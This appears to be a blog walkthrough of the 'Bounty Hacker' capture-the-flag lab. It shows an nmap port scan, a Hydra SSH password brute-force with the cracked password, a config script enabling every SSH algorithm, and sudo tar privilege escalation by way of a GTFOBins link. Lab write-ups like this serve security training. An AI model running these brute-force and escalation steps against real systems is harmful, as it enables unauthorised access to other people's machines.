---
title: Walkthrough - Bounty Hacker - Linux/Tar/PrivESC/Security
published: true
---

You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

![0xskar](/assets/cowboybebop01.jpg)

You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future! 

* * *

## Find open ports on the machine

- ``sudo nmap -Pn -sS -p- -T4 10.10.208.214 -vvv``

```shell

```

* * *

## Who wrote the task list? 

- connect to ftp and download ``locks.txt`` and ``tasks.txt``

* * *

## What service can you bruteforce with the text file found?

So I was having issues brute forcing the SSH with hydra due to a ``kex error : no match for method server host key algo: server [ssh-rsa,rsa-sha2-512,rsa-sha2-256,ecdsa-sha2-nistp256,ssh-ed25519], client [ssh-dss]`` The following code block will fix all login negotaiation errors.

```shell
{
echo -n 'Ciphers '
ssh -Q cipher | tr '\n' ',' | sed -e 's/,$//'; echo

echo -n 'MACs '
ssh -Q mac | tr '\n' ',' | sed -e 's/,$//'; echo

echo -n 'HostKeyAlgorithms '
ssh -Q key | tr '\n' ',' | sed -e 's/,$//'; echo

echo -n 'KexAlgorithms '
ssh -Q kex | tr '\n' ',' | sed -e 's/,$//'; echo

} >> ~/.ssh/config
```

We are now able to run ``hydra -l lin -P locks.txt 10.10.208.214 ssh -t 4`` and get our ssh password.

```shell
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-09 10:32:21
[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
[DATA] attacking ssh://10.10.208.214:22/
[22][ssh] host: 10.10.208.214   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-09 10:32:30
```

* * *

## user.txt

```shell
lin@bountyhacker:~/Desktop$ ls -las
total 12
4 drwxr-xr-x  2 lin lin 4096 Jun  7  2020 .
4 drwxr-xr-x 19 lin lin 4096 Jun  7  2020 ..
4 -rw-rw-r--  1 lin lin   21 Jun  7  2020 user.txt
lin@bountyhacker:~/Desktop$ pwd
/home/lin/Desktop
lin@bountyhacker:~/Desktop$ cat user.txt 
```

* * *

## root.txt

```shell
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Sorry, try again.
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

Easy PrivESC - [https://gtfobins.github.io/gtfobins/tar/#sudo](https://gtfobins.github.io/gtfobins/tar/#sudo)

* * * 








